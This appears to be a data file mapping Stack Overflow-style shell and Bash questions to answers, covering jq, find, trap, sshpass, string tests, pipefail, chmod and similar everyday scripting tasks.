    "How to get key names from JSON using jq": "To get the keys in the order they appear in the original JSON use:\njq 'keys_unsorted' file.json\nIf you want the keys sorted alphanumerically, you can use:\njq 'keys' file.json\nComplete example\n$ cat file.json\n{ \"Created-By\" : \"Apache Maven\", \"Build-Number\" : \"\", \"Archiver-Version\" : \"Plexus Archiver\", \"Build-Id\" : \"\",  \"Build-Tag\" : \"\", \"Built-By\" : \"cporter\"}\n\n$ jq 'keys_unsorted' file.json                                         \n[\n  \"Created-By\",\n  \"Build-Number\",\n  \"Archiver-Version\",\n  \"Build-Id\",\n  \"Build-Tag\",\n  \"Built-By\"\n]\n\n$ jq 'keys' file.json\n[\n  \"Archiver-Version\",\n  \"Build-Id\",\n  \"Build-Number\",\n  \"Build-Tag\",\n  \"Built-By\",\n  \"Created-By\"\n]",
    "How to preserve line breaks when storing command output to a variable? [duplicate]": "With shell scripting, one needs to always quote variables, especially when working with strings.\nHere is an example of the problem:\nExample variable:\n$ f=\"fafafda\n> adffd\n> adfadf\n> adfafd\n> afd\"\nOutput without quoting the variable:\n$ echo $f\nfafafda adffd adfadf adfafd afd\nOutput WITH quoting the variable:\n$ echo \"$f\"\nfafafda\nadffd\nadfadf\nadfafd\nafd\nExplaination:\nWithout quotes, the shell replaces $TEMP with the characters it contains (one of which is a newline). Then, before invoking echo shell splits that string into multiple arguments using the Internal Field Separator (IFS), and passes that resulting list of arguments to echo. By default, the IFS is set to whitespace (spaces, tabs, and newlines), so the shell chops your $TEMP string into arguments and it never gets to see the newline, because the shell considers it a separator, just like a space.",
    "How to set ssh timeout?": "ssh -o ConnectTimeout=10  <hostName>\nWhere 10 is time in seconds. This Timeout applies only to the creation of the connection.",
    "How to use '-prune' option of 'find' in sh?": "The thing I'd found confusing about -prune is that it's an action (like -print), not a test (like -name). It alters the \"to-do\" list, but always returns true.\nThe general pattern for using -prune is this:\nfind [path] [conditions to prune] -prune -o \\\n            [your usual conditions] [actions to perform]\nYou pretty much always want the -o (logical OR) immediately after -prune, because that first part of the test (up to and including -prune) will return false for the stuff you actually want (ie: the stuff you don't want to prune out).\nHere's an example:\nfind . -name .snapshot -prune -o -name '*.foo' -print\nThis will find the \"*.foo\" files that aren't under \".snapshot\" directories. In this example, -name .snapshot makes up the [conditions to prune], and -name '*.foo' -print is [your usual conditions] and [actions to perform].\nImportant notes:\nIf all you want to do is print the results you might be used to leaving out the -print action. You generally don't want to do that when using -prune.\nThe default behavior of find is to \"and\" the entire expression with the -print action if there are no actions other than -prune (ironically) at the end. That means that writing this:\n find . -name .snapshot -prune -o -name '*.foo'              # DON'T DO THIS\nis equivalent to writing this:\n find . \\( -name .snapshot -prune -o -name '*.foo' \\) -print # DON'T DO THIS\nwhich means that it'll also print out the name of the directory you're pruning, which usually isn't what you want. Instead it's better to explicitly specify the -print action if that's what you want:\n find . -name .snapshot -prune -o -name '*.foo' -print       # DO THIS\nIf your \"usual condition\" happens to match files that also match your prune condition, those files will not be included in the output. The way to fix this is to add a -type d predicate to your prune condition.\nFor example, suppose we wanted to prune out any directory that started with .git (this is admittedly somewhat contrived -- normally you only need to remove the thing named exactly .git), but other than that wanted to see all files, including files like .gitignore. You might try this:\nfind . -name '.git*' -prune -o -type f -print               # DON'T DO THIS\nThis would not include .gitignore in the output. Here's the fixed version:\nfind . -name '.git*' -type d -prune -o -type f -print       # DO THIS\nExtra tip: if you're using the GNU version of find, the texinfo page for find has a more detailed explanation than its manpage (as is true for most GNU utilities).",
    "How to run a shell script in OS X by double-clicking?": "First in terminal make the script executable by typing the following command:\n  chmod a+x yourscriptname\nThen, in Finder, right-click your file and select \"Open with\" and then \"Other...\".\nHere you select the application you want the file to execute into, in this case it would be Terminal. To be able to select terminal you need to switch from \"Recommended Applications\" to \"All Applications\". (The Terminal.app application can be found in the Utilities folder)\nNOTE that unless you don't want to associate all files with this extension to be run in terminal you should not have \"Always Open With\" checked.\nAfter clicking OK you should be able to execute you script by simply double-clicking it.",
    "How do I kill background processes / jobs when my shell script exits?": "This works for me (collaborative effort with the commenters):\ntrap \"trap - SIGTERM && kill -- -$$\" SIGINT SIGTERM EXIT\nkill -- -$$ sends a SIGTERM to the whole process group, thus killing also descendants. The <PGID> in kill -- -<PGID> is the group process id, which often, but not necessarily, is the PID that $$ variable contains. The few times PGID and PID differ you can use ps and other similar tools you can obtain the PGID, in your script.\nFor example: pgid=\"$(ps -o pgid= $$ | grep -o '[0-9]*')\" stores PGID in $pgid.\nSpecifying signal EXIT is useful when using set -e (more details here).",
    "Command to change the default home directory of a user [closed]": "Ibrahim's comment on the other answer is the correct way to alter an existing user's home directory.\nChange the user's home directory:\nusermod -d /newhome/username username\nusermod is the command to edit an existing user.\n-d (abbreviation for --home) will change the user's home directory.\n\nChange the user's home directory + Move the contents of the user's current directory:\nusermod -m -d /newhome/username username\n-m (abbreviation for --move-home) will move the content from the user's current directory to the new directory.",
    "How to change Node.js version with nvm": "nvm install 8.10.0 is for installing proposed node version locally.\nIn order to use it:\nnvm use 8.10.0\nNote that you need to run this command as administrator.\nYou can always set default Node.js version:\nnvm alias default 8.10.0",
    "How to evaluate http response codes from bash/shell script?": "I haven't tested this on a 500 code, but it works on others like 200, 302 and 404.\nresponse=$(curl --write-out '%{http_code}' --silent --output /dev/null servername)\nNote, format provided for --write-out should be quoted. As suggested by @ibai, add --head to make a HEAD only request. This will save time when the retrieval is successful since the page contents won't be transmitted.",
    "Bash conditionals: how to \"and\" expressions? (if [ ! -z $VAR && -e $VAR ])": "if [ ! -z \"$var\" ] && [ -e \"$var\" ]; then\n      # something ...\nfi",
    "How can I use Bash syntax in Makefile targets?": "From the GNU Make documentation,\n5.3.2 Choosing the Shell\n------------------------\n\nThe program used as the shell is taken from the variable `SHELL'.  If\nthis variable is not set in your makefile, the program `/bin/sh' is\nused as the shell.\nSo put SHELL := /bin/bash at the top of your makefile, and you should be good to go.\nBTW: You can also do this for one target, at least for GNU Make. Each target can have its own variable assignments, like this:\nall: a b\n\na:\n    @echo \"a is $$0\"\n\nb: SHELL:=/bin/bash   # HERE: this is setting the shell for b only\nb:\n    @echo \"b is $$0\"\nThat'll print:\na is /bin/sh\nb is /bin/bash\nSee \"Target-specific Variable Values\" in the documentation for more details. That line can go anywhere in the Makefile, it doesn't have to be immediately before the target.",
    "What is the Linux equivalent to DOS pause?": "read does this:\nuser@host:~$ read -n1 -r -p \"Press any key to continue...\" key\n[...]\nuser@host:~$ \nThe -n1 specifies that it only waits for a single character. The -r puts it into raw mode, which is necessary because otherwise, if you press something like backslash, it doesn't register until you hit the next key. The -p specifies the prompt, which must be quoted if it contains spaces. The key argument is only necessary if you want to know which key they pressed, in which case you can access it through $key.\nIf you are using Bash, you can also specify a timeout with -t, which causes read to return a failure when a key isn't pressed. So for example:\nread -t5 -n1 -r -p 'Press any key in the next five seconds...' key\nif [ \"$?\" -eq \"0\" ]; then\n    echo 'A key was pressed.'\nelse\n    echo 'No key was pressed.'\nfi",
    "How do you echo a 4-digit Unicode character in Bash?": "In UTF-8 it's actually 6 digits (or 3 bytes).\n$ printf '\\xE2\\x98\\xA0'\n\u2620\nTo check how it's encoded by the console, use hexdump:\n$ printf \u2620 | hexdump\n0000000 98e2 00a0                              \n0000003",
    "Automatically enter SSH password with script": "First you need to install sshpass.\nUbuntu/Debian: apt-get install sshpass\nFedora/CentOS: yum install sshpass\nArch: pacman -S sshpass\nExample:\nsshpass -p \"YOUR_PASSWORD\" ssh -o StrictHostKeyChecking=no YOUR_USERNAME@SOME_SITE.COM\nCustom port example:\nsshpass -p \"YOUR_PASSWORD\" ssh -o StrictHostKeyChecking=no YOUR_USERNAME@SOME_SITE.COM:2400\nNotes:\nsshpass can also read a password from a file when the -f flag is passed.\nUsing -f prevents the password from being visible if the ps command is executed.\nThe file that the password is stored in should have secure permissions.",
    "How to exclude this / current / dot folder from find \"type d\"": "Not only the recursion depth of find can be controlled by the -maxdepth parameter, the depth can also be limited from \u201ctop\u201d using the corresponding -mindepth parameter. So what one actually needs is:\nfind . -mindepth 1 -type d",
    "Subtract two variables in Bash": "Try this Bash syntax instead of trying to use an external program expr:\ncount=$((FIRSTV-SECONDV))\nBTW, the correct syntax of using expr is:\ncount=$(expr $FIRSTV - $SECONDV)\nBut keep in mind using expr is going to be slower than the internal Bash syntax I provided above.",
    "Compare a string using sh shell": "You should use the = operator for string comparison:\nSourcesystem=\"ABC\"\n\nif [ \"$Sourcesystem\" = \"XYZ\" ]; then \n    echo \"Sourcesystem Matched\" \nelse\n    echo \"Sourcesystem is NOT Matched $Sourcesystem\"  \nfi;\nman test says that you use -z to match for empty strings.",
    "How to run mvim (MacVim) from Terminal?": "I don't think I'd to add anything to the path, did\nbrew install macvim\n\nmvim -v\nshould then open macvim in the terminal, you can also go ahead and alias that\nalias vim='mvim -v'",
    "Command to get nth line of STDOUT": "Using sed, just for variety:\nls -l | sed -n 2p\nUsing this alternative, which looks more efficient since it stops reading the input when the required line is printed, may generate a SIGPIPE in the feeding process, which may in turn generate an unwanted error message:\nls -l | sed -n -e '2{p;q}'\nI've seen that often enough that I usually use the first (which is easier to type, anyway), though ls is not a command that complains when it gets SIGPIPE.\nFor a range of lines:\nls -l | sed -n 2,4p\nFor several ranges of lines:\nls -l | sed -n -e 2,4p -e 20,30p\nls -l | sed -n -e '2,4p;20,30p'",
    "Executing multi-line statements in the one-line command-line": "You could do\necho -e \"import sys\\nfor r in range(10): print 'rob'\" | python\nOr without pipes:\npython -c \"exec(\\\"import sys\\nfor r in range(10): print 'rob'\\\")\"\nOr\n(echo \"import sys\" ; echo \"for r in range(10): print 'rob'\") | python\nOr SilentGhost's answer or Crast's answer.",
    "'find -exec' a shell function in Linux": "Since only the shell knows how to run shell functions, you have to run a shell to run a function. You also need to mark your function for export with export -f, otherwise the subshell won't inherit them:\nexport -f dosomething\nfind . -exec bash -c 'dosomething \"$0\"' {} \\;",
    "Looking for ALT+LeftArrowKey solution in zsh": "Run cat then press keys to see the codes your shortcut send.\n(Press Ctrl+C to kill the cat when you're done.)\nFor me, (ubuntu, konsole, xterm) pressing Alt+\u2190 sends ^[[1;3D, so i would put in my .zshrc\nbindkey \"^[[1;3C\" forward-word\nbindkey \"^[[1;3D\" backward-word\n(Actually I prefer to use Ctrl + arrow to move word by word, like in a normal textbox under windows or linux gui.)\nRelated question: Fix key settings (Home/End/Insert/Delete) in .zshrc when running Zsh in Terminator Terminal Emulator",
    "Temporarily change current working directory in bash to run a command [duplicate]": "You can run the cd and the executable in a subshell by enclosing the command line in a pair of parentheses:\n(cd SOME_PATH && exec_some_command)\nDemo:\n$ pwd\n/home/abhijit\n$ (cd /tmp && pwd)  # directory changed in the subshell\n/tmp \n$ pwd               # parent shell's pwd is still the same\n/home/abhijit",
    "How to pass arguments to Shell Script through docker run": "with this script in file.sh\n#!/bin/bash\necho Your container args are: \"$@\"\nand this Dockerfile\nFROM ubuntu:14.04\nCOPY ./file.sh /\nENTRYPOINT [\"/file.sh\"]\nyou should be able to:\n% docker build -t test .\n% docker run test hello world\nYour container args are: hello world",
    "How to store standard error in a variable": "It would be neater to capture the error file thus:\nERROR=$(</tmp/Error)\nThe shell recognizes this and doesn't have to run 'cat' to get the data.\nThe bigger question is hard. I don't think there's an easy way to do it. You'd have to build the entire pipeline into the sub-shell, eventually sending its final standard output to a file, so that you can redirect the errors to standard output.\nERROR=$( { ./useless.sh | sed s/Output/Useless/ > outfile; } 2>&1 )\nNote that the semi-colon is needed (in classic shells - Bourne, Korn - for sure; probably in Bash too). The '{}' does I/O redirection over the enclosed commands. As written, it would capture errors from sed too.\nWARNING: Formally untested code - use at own risk.",
    "How can I quickly sum all numbers in a file?": "You can use awk:\nawk '{ sum += $1 } END { print sum }' file",
    "How do I create a Bash alias?": "You can add an alias or a function in your startup script file.\nMacOS 10.13 High Sierra and earlier:\nThe default shell is bash. Usually the startup script file is .bashrc, .bash_login or .profile file in your home directory.\nSince these files are hidden you will have to do an ls -a to list them. If you don't have one you can create one.\nIf I remember correctly, when I had bought my Mac, the .bash_login file wasn't there. I had to create it for myself so that I could put prompt info, alias, functions, etc. in it.\nHere are the steps if you would like to create one:\nStart up Terminal\nType cd ~/ to go to your home folder\nType touch .bash_profile to create your new file.\nEdit .bash_profile with your favorite editor (or you can just type open -e .bash_profile to open it in TextEdit.\nType . .bash_profile to reload .bash_profile and update any alias you add.",
    "How to split one string into multiple variables in bash shell? [duplicate]": "To split a string separated by -, you can use read with IFS:\n$ IFS=- read -r var1 var2 <<< ABCDE-123456\n$ echo \"$var1\"\nABCDE\n$ echo \"$var2\"\n123456\nEdit:\nHere is how you can read each individual character into array elements:\n$ read -ra foo <<<\"$(echo \"ABCDE-123456\" | sed 's/./& /g')\"\nDump the array:\n$ declare -p foo\ndeclare -a foo='([0]=\"A\" [1]=\"B\" [2]=\"C\" [3]=\"D\" [4]=\"E\" [5]=\"-\" [6]=\"1\" [7]=\"2\" [8]=\"3\" [9]=\"4\" [10]=\"5\" [11]=\"6\")'\nIf there are spaces in the string:\n$ IFS=$'\\v' read -ra foo <<<\"$(echo \"ABCDE 123456\" | sed $'s/./&\\v/g')\"\n$ declare -p foo\ndeclare -a foo='([0]=\"A\" [1]=\"B\" [2]=\"C\" [3]=\"D\" [4]=\"E\" [5]=\" \" [6]=\"1\" [7]=\"2\" [8]=\"3\" [9]=\"4\" [10]=\"5\" [11]=\"6\")'",
    "How to resolve symbolic links in a shell script": "readlink -f \"$path\"\nEditor's note: The above works with GNU readlink and FreeBSD/PC-BSD/OpenBSD readlink, but not on OS X as of 10.11.\nGNU readlink offers additional, related options, such as -m for resolving a symlink whether or not the ultimate target exists.\nNote since GNU coreutils 8.15 (2012-01-06), there is a realpath program available that is less obtuse and more flexible than the above. It's also compatible with the FreeBSD util of the same name. It also includes functionality to generate a relative path between two files.\nrealpath $path\n[Admin addition below from comment by halloleo \u2014danorton]\nFor Mac OS X (through at least 10.11.x), use readlink without the -f option:\nreadlink $path\nEditor's note: This will not resolve symlinks recursively and thus won't report the ultimate target; e.g., given symlink a that points to b, which in turn points to c, this will only report b (and won't ensure that it is output as an absolute path).\nUse the following perl command on OS X to fill the gap of the missing readlink -f functionality:\nperl -MCwd -le 'print Cwd::abs_path(shift)' \"$path\"",
    "Piping command output to tee but also save exit code of command [duplicate]": "You can set the pipefail shell option option on to get the behavior you want.\nFrom the Bash Reference Manual:\nThe exit status of a pipeline is the exit status of the last command in the pipeline, unless the pipefail option is enabled (see The Set Builtin). If pipefail is enabled, the pipeline's return status is the value of the last (rightmost) command to exit with a non-zero status, or zero if all commands exit successfully.\nExample:\n$ false | tee /dev/null ; echo $?\n0\n$ set -o pipefail\n$ false | tee /dev/null ; echo $?\n1\nTo restore the original pipe setting:\n$ set +o pipefail",
    "What's an easy way to read random line from a file?": "You can use shuf:\nshuf -n 1 $FILE\nThere is also a utility called rl. In Debian it's in the randomize-lines package that does exactly what you want, though not available in all distros. On its home page it actually recommends the use of shuf instead (which didn't exist when it was created, I believe). shuf is part of the GNU coreutils, rl is not.\nrl -c 1 $FILE",
    "How to run a PowerShell script from a batch file": "You need the -ExecutionPolicy parameter:\nPowershell.exe -executionpolicy remotesigned -File  C:\\Users\\SE\\Desktop\\ps.ps1\nOtherwise PowerShell considers the arguments a line to execute and while Set-ExecutionPolicy is a cmdlet, it has no -File parameter.",
    "Shell script \"for\" loop syntax": "Brace expansion, {x..y} is performed before other expansions, so you cannot use that for variable length sequences.\nInstead, use the seq 2 $max method as user mob stated.\nSo, for your example it would be:\nmax=10\nfor i in `seq 2 $max`\ndo\n    echo \"$i\"\ndone",
    "Pass all variables from one shell script to another?": "You have basically two options:\nMake the variable an environment variable (export TESTVARIABLE) before executing the 2nd script.\nSource the 2nd script, i.e. . test2.sh and it will run in the same shell. This would let you share more complex variables like arrays easily, but also means that the other script could modify variables in the source shell.\nUPDATE:\nTo use export to set an environment variable, you can either use an existing variable:\nA=10\n# ...\nexport A\nThis ought to work in both bash and sh. bash also allows it to be combined like so:\nexport A=10\nThis also works in my sh (which happens to be bash, you can use echo $SHELL to check). But I don't believe that that's guaranteed to work in all sh, so best to play it safe and separate them.\nAny variable you export in this way will be visible in scripts you execute, for example:\na.sh:\n#!/bin/sh\n\nMESSAGE=\"hello\"\nexport MESSAGE\n./b.sh\nb.sh:\n#!/bin/sh\n\necho \"The message is: $MESSAGE\"\nThen:\n$ ./a.sh\nThe message is: hello\nThe fact that these are both shell scripts is also just incidental. Environment variables can be passed to any process you execute, for example if we used python instead it might look like:\na.sh:\n#!/bin/sh\n\nMESSAGE=\"hello\"\nexport MESSAGE\n./b.py\nb.py:\n#!/usr/bin/python\n\nimport os\n\nprint 'The message is:', os.environ['MESSAGE']\nSourcing:\nInstead we could source like this:\na.sh:\n#!/bin/sh\n\nMESSAGE=\"hello\"\n\n. ./b.sh\nb.sh:\n#!/bin/sh\n\necho \"The message is: $MESSAGE\"\nThen:\n$ ./a.sh\nThe message is: hello\nThis more or less \"imports\" the contents of b.sh directly and executes it in the same shell. Notice that we didn't have to export the variable to access it. This implicitly shares all the variables you have, as well as allows the other script to add/delete/modify variables in the shell. Of course, in this model both your scripts should be the same language (sh or bash). To give an example how we could pass messages back and forth:\na.sh:\n#!/bin/sh\n\nMESSAGE=\"hello\"\n\n. ./b.sh\n\necho \"[A] The message is: $MESSAGE\"\nb.sh:\n#!/bin/sh\n\necho \"[B] The message is: $MESSAGE\"\n\nMESSAGE=\"goodbye\"\nThen:\n$ ./a.sh\n[B] The message is: hello\n[A] The message is: goodbye\nThis works equally well in bash. It also makes it easy to share more complex data which you could not express as an environment variable (at least without some heavy lifting on your part), like arrays or associative arrays.",
    "Only get hash value using md5sum (without filename)": "A simple array assignment works... Note that the first element of a Bash array can be addressed by just the name without the [0] index, i.e., $md5 contains only the 32 characters of md5sum.\nmd5=($(md5sum file))\necho $md5\n# 53c8fdfcbb60cf8e1a1ee90601cc8fe2",
    "How to get the second column from command output?": "Use -F [field separator] to split the lines on \"s:\nawk -F '\"' '{print $2}' your_input_file\nor for input from pipe\n<some_command> | awk -F '\"' '{print $2}'\noutput:\nA B\nC\nD",
    "How do I redirect output to a variable in shell? [duplicate]": "Use the $( ... ) construct:\nhash=$(genhash --use-ssl -s $IP -p 443 --url $URL | grep MD5 | grep -c $MD5)",
    "Test for non-zero length string in Bash: [ -n \"$var\" ] or [ \"$var\" ]": "Edit: This is a more complete version that shows more differences between [ (aka test) and [[.\nThe following table shows that whether a variable is quoted or not, whether you use single or double brackets and whether the variable contains only a space are the things that affect whether using a test with or without -n/-z is suitable for checking a variable.\n     | 1a    2a    3a    4a    5a    6a   | 1b    2b    3b    4b    5b    6b\n     | [     [\"    [-n   [-n\"  [-z   [-z\" | [[    [[\"   [[-n  [[-n\" [[-z  [[-z\"\n-----+------------------------------------+------------------------------------\nunset| false false true  false true  true | false false false false true  true\nnull | false false true  false true  true | false false false false true  true\nspace| false true  true  true  true  false| true  true  true  true  false false\nzero | true  true  true  true  false false| true  true  true  true  false false\ndigit| true  true  true  true  false false| true  true  true  true  false false\nchar | true  true  true  true  false false| true  true  true  true  false false\nhyphn| true  true  true  true  false false| true  true  true  true  false false\ntwo  | -err- true  -err- true  -err- false| true  true  true  true  false false\npart | -err- true  -err- true  -err- false| true  true  true  true  false false\nTstr | true  true  -err- true  -err- false| true  true  true  true  false false\nFsym | false true  -err- true  -err- false| true  true  true  true  false false\nT=   | true  true  -err- true  -err- false| true  true  true  true  false false\nF=   | false true  -err- true  -err- false| true  true  true  true  false false\nT!=  | true  true  -err- true  -err- false| true  true  true  true  false false\nF!=  | false true  -err- true  -err- false| true  true  true  true  false false\nTeq  | true  true  -err- true  -err- false| true  true  true  true  false false\nFeq  | false true  -err- true  -err- false| true  true  true  true  false false\nTne  | true  true  -err- true  -err- false| true  true  true  true  false false\nFne  | false true  -err- true  -err- false| true  true  true  true  false false\nIf you want to know if a variable is non-zero length, do any of the following:\nquote the variable in single brackets (column 2a)\nuse -n and quote the variable in single brackets (column 4a)\nuse double brackets with or without quoting and with or without -n (columns 1b - 4b)\nNotice in column 1a starting at the row labeled \"two\" that the result indicates that [ is evaluating the contents of the variable as if they were part of the conditional expression (the result matches the assertion implied by the \"T\" or \"F\" in the description column). When [[ is used (column 1b), the variable content is seen as a string and not evaluated.\nThe errors in columns 3a and 5a are caused by the fact that the variable value includes a space and the variable is unquoted. Again, as shown in columns 3b and 5b, [[ evaluates the variable's contents as a string.\nCorrespondingly, for tests for zero-length strings, columns 6a, 5b and 6b show the correct ways to do that. Also note that any of these tests can be negated if negating shows a clearer intent than using the opposite operation. For example: if ! [[ -n $var ]].\nIf you're using [, the key to making sure that you don't get unexpected results is quoting the variable. Using [[, it doesn't matter.\nThe error messages, which are being suppressed, are \"unary operator expected\" or \"binary operator expected\".\nThis is the script that produced the table above.\n#!/bin/bash\n# by Dennis Williamson\n# 2010-10-06, revised 2010-11-10\n# for http://stackoverflow.com/q/3869072\n# designed to fit an 80 character terminal\n\ndw=5    # description column width\nw=6     # table column width\n\nt () { printf '%-*s' \"$w\" \" true\"; }\nf () { [[ $? == 1 ]] && printf '%-*s' \"$w\" \" false\" || printf '%-*s' \"$w\" \" -err-\"; }\n\no=/dev/null\n\necho '     | 1a    2a    3a    4a    5a    6a   | 1b    2b    3b    4b    5b    6b'\necho '     | [     [\"    [-n   [-n\"  [-z   [-z\" | [[    [[\"   [[-n  [[-n\" [[-z  [[-z\"'\necho '-----+------------------------------------+------------------------------------'\n\nwhile read -r d t\ndo\n    printf '%-*s|' \"$dw\" \"$d\"\n\n    case $d in\n        unset) unset t  ;;\n        space) t=' '    ;;\n    esac\n\n    [ $t ]        2>$o  && t || f\n    [ \"$t\" ]            && t || f\n    [ -n $t ]     2>$o  && t || f\n    [ -n \"$t\" ]         && t || f\n    [ -z $t ]     2>$o  && t || f\n    [ -z \"$t\" ]         && t || f\n    echo -n \"|\"\n    [[ $t ]]            && t || f\n    [[ \"$t\" ]]          && t || f\n    [[ -n $t ]]         && t || f\n    [[ -n \"$t\" ]]       && t || f\n    [[ -z $t ]]         && t || f\n    [[ -z \"$t\" ]]       && t || f\n    echo\n\ndone <<'EOF'\nunset\nnull\nspace\nzero    0\ndigit   1\nchar    c\nhyphn   -z\ntwo     a b\npart    a -a\nTstr    -n a\nFsym    -h .\nT=      1 = 1\nF=      1 = 2\nT!=     1 != 2\nF!=     1 != 1\nTeq     1 -eq 1\nFeq     1 -eq 2\nTne     1 -ne 2\nFne     1 -ne 1\nEOF",
    "Rename multiple files by replacing a particular pattern in the filenames using a shell script [duplicate]": "An example to help you get off the ground.\nfor f in *.jpg; do mv \"$f\" \"$(echo \"$f\" | sed s/IMG/VACATION/)\"; done\nIn this example, I am assuming that all your image files contain the string IMG and you want to replace IMG with VACATION.\nThe shell automatically evaluates *.jpg to all the matching files.\nThe second argument of mv (the new name of the file) is the output of the sed command that replaces IMG with VACATION.\nIf your filenames include whitespace pay careful attention to the \"$f\" notation. You need the double-quotes to preserve the whitespace.",
    "How to retrieve absolute path given relative": "Try realpath.\n~ $ sudo apt-get install realpath  # may already be installed\n~ $ realpath .bashrc\n/home/username/.bashrc\nTo avoid expanding symlinks, use realpath -s.\nThe answer comes from \"bash/fish command to print absolute path to a file\".",
    "Running my program says \"bash: ./program Permission denied\" [closed]": "chmod u+x program_name. Then execute it.\nIf that does not work, copy the program from the USB device to a native volume on the system. Then chmod u+x program_name on the local copy and execute that.\nUnix and Unix-like systems generally will not execute a program unless it is marked with permission to execute. The way you copied the file from one system to another (or mounted an external volume) may have turned off execute permission (as a safety feature). The command chmod u+x name adds permission for the user that owns the file to execute it.\nThat command only changes the permissions associated with the file; it does not change the security controls associated with the entire volume. If it is security controls on the volume that are interfering with execution (for example, a noexec option may be specified for a volume in the Unix fstab file, which says not to allow execute permission for files on the volume), then you can remount the volume with options to allow execution. However, copying the file to a local volume may be a quicker and easier solution.",
    "How to merge 2 JSON objects from 2 files using jq?": "Since 1.4 this is now possible with the * operator. When given two objects, it will merge them recursively. For example,\njq -s '.[0] * .[1]' file1 file2\nImportant: Note the -s (--slurp) flag, which puts files in the same array.\nWould get you:\n{\n  \"value1\": 200,\n  \"timestamp\": 1382461861,\n  \"value\": {\n    \"aaa\": {\n      \"value1\": \"v1\",\n      \"value2\": \"v2\",\n      \"value3\": \"v3\",\n      \"value4\": 4\n    },\n    \"bbb\": {\n      \"value1\": \"v1\",\n      \"value2\": \"v2\",\n      \"value3\": \"v3\"\n    },\n    \"ccc\": {\n      \"value1\": \"v1\",\n      \"value2\": \"v2\"\n    },\n    \"ddd\": {\n      \"value3\": \"v3\",\n      \"value4\": 4\n    }\n  },\n  \"status\": 200\n}\nIf you also want to get rid of the other keys (like your expected result), one way to do it is this:\njq -s '.[0] * .[1] | {value: .value}' file1 file2\nOr the presumably somewhat more efficient (because it doesn't merge any other values):\njq -s '.[0].value * .[1].value | {value: .}' file1 file2",
    "How to grep for case insensitive string in a file?": "You can use the -i flag which makes your pattern case insensitive:\ngrep -iF \"success...\" file1\nAlso, there is no need for cat. grep takes a file with the syntax grep <pattern> <file>. I also used the -F flag to search for a fixed string to avoid escaping the ellipsis.",
    "Chmod recursively": "You can use chmod with the X mode letter (the capital X) to set the executable flag only for directories.\nIn the example below, the executable flag is cleared and then set for all directories recursively:\n~$ mkdir foo\n~$ mkdir foo/bar\n~$ mkdir foo/baz\n~$ touch foo/x\n~$ touch foo/y\n\n~$ chmod -R go-X foo \n~$ ls -l foo\ntotal 8\ndrwxrw-r-- 2 wq wq 4096 Nov 14 15:31 bar\ndrwxrw-r-- 2 wq wq 4096 Nov 14 15:31 baz\n-rw-rw-r-- 1 wq wq    0 Nov 14 15:31 x\n-rw-rw-r-- 1 wq wq    0 Nov 14 15:31 y\n\n~$ chmod -R go+X foo \n~$ ls -l foo\ntotal 8\ndrwxrwxr-x 2 wq wq 4096 Nov 14 15:31 bar\ndrwxrwxr-x 2 wq wq 4096 Nov 14 15:31 baz\n-rw-rw-r-- 1 wq wq    0 Nov 14 15:31 x\n-rw-rw-r-- 1 wq wq    0 Nov 14 15:31 y\nA bit of explanation:\nchmod -x foo - clear the eXecutable flag for foo\nchmod +x foo - set the eXecutable flag for foo\nchmod go+x foo - same as above, but set the flag only for Group and Other users, don't touch the User (owner) permission\nchmod go+X foo - same as above, but apply only to directories, don't touch files\nchmod -R go+X foo - same as above, but do this Recursively for all subdirectories of foo",
    "Listing only directories in UNIX": "Try this ls -d */ to list directories within the current directory",
    "How to break out of a loop in Bash?": "It's not that different in bash.\nworkdone=0\nwhile : ; do\n  ...\n  if [ \"$workdone\" -ne 0 ]; then\n      break\n  fi\ndone\n: is the no-op command; its exit status is always 0, so the loop runs until workdone is given a non-zero value.\nThere are many ways you could set and test the value of workdone in order to exit the loop; the one I show above should work in any POSIX-compatible shell.",
    "Longest line in a file": "Using wc (GNU coreutils) 7.4:\nwc -L filename\ngives:\n101 filename",
    "Is there a way to 'uniq' by column?": "sort -u -t, -k1,1 file\n-u for unique\n-t, so comma is the delimiter\n-k1,1 for the key field 1\nTest result:\noverflow@domain2.example,2009-11-27 00:58:29.793000000,xx3.net,255.255.255.0\nstack2@domain.example,2009-11-27 01:05:47.893000000,xx2.net,127.0.0.1",
    "redirect COPY of stdout to log file from within bash script itself": "#!/usr/bin/env bash\n\n# Redirect stdout ( > ) into a named pipe ( >() ) running \"tee\"\nexec > >(tee -i logfile.txt)\n\n# Without this, only stdout would be captured - i.e. your\n# log file would not contain any error messages.\n# SEE (and upvote) the answer by Adam Spiers, which keeps STDERR\n# as a separate stream - I did not want to steal from him by simply\n# adding his answer to mine.\nexec 2>&1\n\necho \"foo\"\necho \"bar\" >&2\nNote that this is bash, not sh. If you invoke the script with sh myscript.sh, you will get an error along the lines of syntax error near unexpected token '>'.\nIf you are working with signal traps, you might want to use the tee -i option to avoid disruption of the output if a signal occurs. (Thanks to JamesThomasMoon1979 for the comment.)\nTools that change their output depending on whether they write to a pipe or a terminal (ls using colors and columnized output, for example) will detect the above construct as meaning that they output to a pipe.\nThere are options to enforce the colorizing / columnizing (e.g. ls -C --color=always). Note that this will result in the color codes being written to the logfile as well, making it less readable.",
    "Shell Script: Execute a python program from within a shell script": "Just make sure the python executable is in your PATH environment variable then add in your script\npython path/to/the/python_script.py\nDetails:\nIn the file job.sh, put this\n#!/bin/sh\npython python_script.py\nExecute this command to make the script runnable for you : chmod u+x job.sh\nRun it : ./job.sh",
    "Shell command to find lines common in two files": "The command you are seeking is comm. eg:-\ncomm -12 1.sorted.txt 2.sorted.txt\nHere:\n-1 : suppress column 1 (lines unique to 1.sorted.txt)\n-2 : suppress column 2 (lines unique to 2.sorted.txt)",
    "How do I read user input into a variable in Bash?": "Use read -p:\n# fullname=\"USER INPUT\"\nread -p \"Enter fullname: \" fullname\n# user=\"USER INPUT\"\nread -p \"Enter user: \" user\nIf you like to get the user's confirmation:\nread -p \"Continue? (Y/N): \" confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1\nYou should also quote your variables to prevent filename expansion and word splitting with spaces:\n# passwd \"$user\"\n# mkdir \"$home\"\n# chown \"$user:$group\" \"$home\"",
    "Convert command line arguments into an array in Bash": "Actually your command line arguments are practically like an array already. At least, you can treat the $@ variable much like an array. That said, you can convert it into an actual array like this:\nmyArray=( \"$@\" )\nIf you just want to type some arguments and feed them into the $@ value, use set:\n$ set -- apple banana 'kiwi fruit'\n$ echo \"$#\"\n3\n$ echo \"$@\"\napple banana kiwi fruit\n$ for arg in \"${@}\"; do echo -n \", $arg\"; done\n, apple, banana, kiwi fruit\nUnderstanding how to use the argument structure is particularly useful in POSIX sh, which has nothing else like an array.",
